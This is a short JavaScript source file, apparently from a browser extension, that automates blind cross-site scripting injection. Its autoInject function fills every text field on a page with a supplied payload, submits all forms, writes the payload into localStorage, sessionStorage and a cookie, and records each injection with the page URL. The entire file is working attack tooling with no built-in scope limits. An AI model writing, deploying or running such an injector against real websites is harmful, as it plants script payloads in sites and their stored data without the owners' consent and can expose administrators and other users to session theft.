// injector.js
// Attempts to inject a blind XSS payload into input fields
export async function autoInject(payload) {
  if (!payload) return;
  const inputs = document.querySelectorAll('input[type="text"], textarea, input:not([type])');
  inputs.forEach(input => {
    input.value = payload;
  });
  const forms = document.querySelectorAll('form');
  forms.forEach(form => form.dispatchEvent(new Event('submit', { cancelable: true })));
  // also drop payload in storage and cookies
  try {
    localStorage.setItem('xss', payload);
    sessionStorage.setItem('xss', payload);
    document.cookie = `xss=${encodeURIComponent(payload)}; path=/`;
  } catch (e) {
    console.error('storage injection failed', e);
  }
  const { history = [] } = await chrome.storage.local.get('history');
  history.push({ payload, url: location.href, time: Date.now() });
  await chrome.storage.local.set({ history });
  chrome.runtime.sendMessage({ type: 'injection', count: inputs.length });
}
